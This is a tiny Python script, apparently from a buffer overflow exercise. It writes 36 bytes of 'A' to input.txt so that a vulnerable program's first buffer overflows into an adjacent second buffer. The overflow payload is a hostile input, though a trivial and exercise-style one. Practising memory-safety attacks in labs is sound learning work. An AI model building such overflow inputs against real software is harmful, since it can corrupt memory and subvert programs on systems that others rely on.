with open('input.txt', 'wb') as f:
    # Create a payload that overflows buffer1 and overwrites buffer2
    payload = b'A' * 32 + b'AAAA'
    f.write(payload)